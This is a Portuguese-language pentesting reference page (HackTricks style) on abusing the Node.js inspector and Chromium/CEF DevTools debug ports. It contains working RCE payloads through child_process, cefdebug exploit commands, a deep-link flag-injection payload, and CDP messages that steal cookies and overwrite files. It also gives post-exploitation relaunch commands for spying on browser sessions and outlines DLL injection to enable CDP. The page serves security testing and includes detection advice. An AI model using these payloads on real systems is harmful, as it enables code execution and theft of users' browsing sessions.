# Abuso de debug do Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Exemplos práticos históricos incluem o walkthrough do Multimaster e o ataque ao debugger do Visual Studio Code CVE-2019-1414; use-os como contexto específico da versão, em vez de presumir que todo target Electron ou Chromium atual expõe as mesmas primitivas.<sup>[[1]](#references)[[3]](#references)</sup>

## Informações básicas

[Da documentação](https://nodejs.org/learn/getting-started/debugging): quando iniciado com a opção `--inspect`, um processo Node.js escuta por um cliente de debugging. Por **padrão**, ele escutará no host e na porta **`127.0.0.1:9229`**. Cada processo também recebe um **UUID** **exclusivo**.<sup>[[4]](#references)</sup>

Os clientes do Inspector precisam conhecer e especificar o endereço do host, a porta e o UUID para se conectarem. Uma URL completa será semelhante a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Como o **debugger tem acesso total ao ambiente de execução do Node.js**, um agente malicioso capaz de se conectar a essa porta poderá executar código arbitrário em nome do processo Node.js (**potencial escalada de privilégios**).<sup>[[4]](#references)</sup>

Há várias formas de iniciar um Inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando você inicia um processo inspecionado, algo parecido com isto aparecerá:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processos baseados em **CEF** (**Chromium Embedded Framework**) podem expor um debugger com `--remote-debugging-port=9222`. Isso expõe o browser por meio do [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) em vez de um inspector do Node.js, portanto payloads baseados em `process` do Node.js não são diretamente aplicáveis por padrão.<sup>[[2]](#references)[[5]](#references)</sup>

Ao iniciar um browser com debugging, algo semelhante a isto aparecerá:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Enumerando e controlando um endpoint CDP

Os endpoints HTTP de descoberta distinguem o WebSocket do **browser** dos WebSockets de **target** individuais (aba, worker, extensão etc.). Consulte `/json/version` para obter o endpoint do browser e `/json/list` para obter os targets; os valores `webSocketDebuggerUrl` retornados podem então ser controlados diretamente com mensagens semelhantes a JSON-RPC do CDP.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Por exemplo, conecte-se com `websocat "$BROWSER_WS"` e envie `{"id":1,"method":"Target.getTargets"}` ou `{"id":2,"method":"Storage.getCookies"}`. Em um page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` executa nesse renderer e `Page.captureScreenshot` retorna uma captura de tela codificada em base64. `document.cookie` não pode revelar cookies `HttpOnly`, enquanto `Storage.getCookies` solicita ao browser seu cookie store.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Browsers, WebSockets e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Sites abertos em um navegador web podem fazer requisições WebSocket e HTTP sob o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um ID exclusivo de sessão do debugger**. A **same-origin-policy** **impede** que os sites possam fazer **essa conexão HTTP**. Para obter segurança adicional contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** o Node.js verifica se os **headers 'Host'** da conexão especificam um **endereço IP** ou **`localhost`** precisamente.<sup>[[4]](#references)</sup>

> [!TIP]
> Essa **medida de segurança impede explorar o inspector** para executar código **apenas enviando uma requisição HTTP** (o que poderia ser feito explorando uma vuln de SSRF).<sup>[[4]](#references)</sup>

### Iniciando o inspector em processos em execução

Você pode enviar o **sinal SIGUSR1** para um processo nodejs em execução para fazê-lo **iniciar o inspector** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes; portanto, isso pode conceder **acesso privilegiado a informações dentro do processo**, mas não uma privilege escalation direta.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Isso é útil em containers porque **encerrar o processo e iniciar um novo** com `--inspect` **não é uma opção**, pois o **container** será **encerrado** junto com o processo.<sup>[[6]](#references)</sup>

### Conectar ao inspector/debugger

Para conectar a um **navegador baseado em Chromium**, as URLs `chrome://inspect` ou `edge://inspect` podem ser acessadas para Chrome ou Edge, respectivamente. Ao clicar no botão Configure, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Após uma URL para acessar o debugger aparecerá. ex.: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectar ao inspector/debugger: Para conectar a um navegador baseado em Chromium,...](<../../images/image (674).png>)

Usando a **linha de comando**, você pode conectar-se a um debugger/inspector com:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectors** em execução localmente e **injetar código** neles.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Observe que exploits de **RCE em NodeJS** não funcionarão se conectado a um navegador via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (você precisa verificar a API para encontrar coisas interessantes para fazer com ela).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Se você veio aqui procurando saber como obter [**RCE a partir de um XSS no Electron, confira esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algumas formas comuns de obter **RCE** quando você consegue **conectar-se** a um **inspector** do Node é usando algo como (aparentemente isso **não funcionará em uma conexão com o Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads do Chrome DevTools Protocol

Você pode consultar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Nesta seção, vou apenas listar coisas interessantes que encontrei que foram usadas para explorar este protocolo.

### Restrição do perfil padrão no Chrome 136+

A partir do **Chrome 136**, o Chrome ignora `--remote-debugging-port` e `--remote-debugging-pipe` quando eles têm como alvo o **diretório de dados padrão do Chrome**. O switch deve ser combinado com um `--user-data-dir` não padrão, cuja chave de criptografia separada e o estado isolado do navegador impedem que a simples técnica baseada em flags exponha o perfil autenticado normal do usuário. Essa restrição específica do Chrome não deve ser considerada aplicável a versões mais antigas do Chrome, Chrome for Testing, aplicativos Electron/CEF ou outros derivados do Chromium sem verificação.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Portanto, ver um processo atual do Chrome iniciado apenas com `--remote-debugging-port` **não** prova que o CDP tenha sido ativado. Confirme o listener e `/json/version`, e determine qual perfil realmente o utiliza.<sup>[[14]](#references)</sup>

### Injeção de Parâmetros via Deep Links

No [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), a Rhino Security descobriu que uma aplicação baseada em CEF **registrou uma URI personalizada** no sistema (workspaces://index.html), que recebia a URI completa e então **iniciava a aplicação baseada em CEF** com uma configuração parcialmente construída a partir dessa URI.<sup>[[8]](#references)</sup>

Foi descoberto que os parâmetros da URI eram decodificados por URL e usados para iniciar a aplicação básica baseada em CEF, permitindo que um usuário **injetasse** a flag **`--gpu-launcher`** na **linha de comando** e executasse coisas arbitrárias.<sup>[[8]](#references)</sup>

Assim, um payload como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Executará um calc.exe.<sup>[[8]](#references)</sup>

### Sobrescrever Arquivos

Altere a pasta onde os **arquivos baixados serão salvos** e baixe um arquivo para **sobrescrever** o **código-fonte** frequentemente usado pelo aplicativo com seu **código malicioso**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE e exfiltration

A STAR Labs demonstrou que serviços WebDriver/CDP expostos podem permitir leitura arbitrária de arquivos e RCE; o DNS rebinding pode completar a cadeia de exploit em algumas configurações.<sup>[[9]](#references)</sup>

Para casos históricos adicionais de browser-automation e segurança do Chromium, consulte o write-up do Counter WebDriver e os issues 773, 1742 e 1944 do Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Habilitando o CDP dentro de um processo Chromium em execução

No Windows, o [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) demonstrou que a restrição de linha de comando não é a única forma de ativar o CDP: um código já capaz de injetar em um `msedge.exe` existente pode invocar o `content::DevToolsAgentHost::StartRemoteDebuggingServer` não exportado do Chromium e expor o perfil autenticado em execução sem reiniciar o browser.<sup>[[15]](#references)</sup>

A cadeia demonstrada injeta uma DLL com `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, resolve símbolos internos do Edge (primeiro a partir de PDBs e depois com byte signatures específicas da versão), subclasses a janela do browser e envia uma mensagem para que a chamada final de inicialização do servidor seja executada na **UI thread** do browser. O socket é associado ao loopback, após o que as primitivas normais do CDP podem recuperar cookies, capturar abas, inspecionar tráfego de rede ou avaliar JavaScript em páginas autenticadas.<sup>[[15]](#references)</sup>

> [!WARNING]
> Esta é uma técnica de **post-compromise/process-injection**, não um bypass de rede não autenticado. Ela depende fortemente da build, pois os símbolos C++ relevantes não são exportados e as signatures podem mudar após atualizações do browser.<sup>[[15]](#references)</sup>

Para detecção, não dependa apenas da telemetria de linha de comando `--remote-debugging-*`: correlacione também handles incomuns e operações de memória contra processos do browser (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, criação de threads), DLL injection e sockets de escuta inesperados no loopback pertencentes ao Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Em um ambiente real e **após comprometer** um PC de usuário que utiliza um browser baseado em Chromium, uma técnica histórica consistia em reiniciar o browser com debugging habilitado e encaminhar a porta de loopback. Isso pode expor o estado de browsing da vítima em produtos/builds que ainda aceitam o perfil selecionado, mas o Chrome 136+ não aceitará isso em relação ao seu diretório de dados padrão.<sup>[[7]](#references)[[14]](#references)</sup>

O comando de reinicialização original é preservado abaixo para alvos antigos/específicos de versão. O segundo comando é o formato atual compatível com o Chrome, mas cria um perfil isolado em vez de reabrir o estado autenticado normal da vítima.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Para tradecraft específico de macOS relacionado a relaunch, extension e CDP do Chromium, consulte [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - ferramenta de inspeção e exploração do debugger do CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Execução Remota de Código no Visual Studio Code via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guia de Debugging do Node.js - Primeiros passos](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup do corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusando do recurso de debugging do Chrome para observar e controlar remotamente sessões de navegação](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Execução Remota de Código no AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Você está falando comigo? - RCE no WebDriver via DNS Rebinding e CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contra o WebDriver - De Bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Issue 773 do Google Project Zero (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Issue 1742 do Google Project Zero (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Issue 1944 do Google Project Zero (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Alterações nas switches de remote debugging para melhorar a segurança - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injetando CDP em um navegador Edge em execução: uma análise aprofundada da instrumentação de runtime do navegador](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
